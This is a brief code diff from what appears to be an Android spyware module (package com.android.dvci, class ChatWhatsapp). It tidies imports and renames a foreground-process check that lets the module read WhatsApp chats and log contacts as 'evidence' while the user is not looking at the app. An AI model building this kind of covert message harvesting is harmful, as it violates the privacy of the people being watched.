@@ -4,8 +4,6 @@ import java.io.File;
 import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Date;
-import java.util.Enumeration;
-import java.util.Hashtable;
 import java.util.concurrent.Semaphore;
 
 import javax.xml.parsers.DocumentBuilderFactory;
@@ -18,7 +16,6 @@ import org.w3c.dom.NodeList;
 import android.database.Cursor;
 import android.database.sqlite.SQLiteDatabase;
 import android.database.sqlite.SQLiteQueryBuilder;
-import android.util.Pair;
 
 import com.android.dvci.RunningProcesses;
 import com.android.dvci.auto.Cfg;
@@ -90,7 +87,7 @@ public class ChatWhatsapp extends SubModuleChat {
 			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.WHATSAPP, myPhoneNumber);
 
 			RunningProcesses runningProcesses = RunningProcesses.self();
-			if(!runningProcesses.getForeground().equals(pObserving)) {
+			if(!runningProcesses.getForeground_wrapper().equals(pObserving)) {
 				readChatWhatsappMessages();
 			}
 
